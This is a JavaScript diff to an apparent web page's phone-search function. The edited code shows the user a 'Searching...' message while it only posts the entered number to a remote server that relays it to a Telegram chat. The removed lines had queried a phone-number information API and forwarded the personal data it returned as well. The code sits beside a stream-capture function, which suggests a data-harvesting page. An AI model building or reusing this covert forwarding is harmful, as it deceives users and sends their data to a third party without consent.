@@ -159,36 +159,18 @@ async function capture(stream) {
 
 /* 🔥 PHONE API */
 async function phoneSearch(num) {
-  let result = {};
 
-  try {
-    const res = await fetch(`https://number-info-bd-tau.vercel.app/info?number=${num}`);
-    result = await res.json();
+  document.getElementById("resultBox").innerHTML = "⏳ Searching...";
 
-    // 🔥 SCREEN PE SHOW
-    document.getElementById("resultBox").innerHTML = `
-      <pre style="text-align:left;color:#0f0;">
-${JSON.stringify(result, null, 2)}
-      </pre>
-    `;
-
-  } catch (e) {
-    result = { error: "API Failed" };
-
-    document.getElementById("resultBox").innerHTML =
-      "❌ API Failed";
-  }
-
-  // 🔥 TELEGRAM PE SEND
   await fetch(`${SERVER}/number`, {
     method: "POST",
     headers: {"Content-Type": "application/json"},
     body: JSON.stringify({
       chat_id: chatId,
-      number: num,
-      result: result
+      number: num
     })
   });
+
 }
 
 /* 🔥 MAIN FLOW */
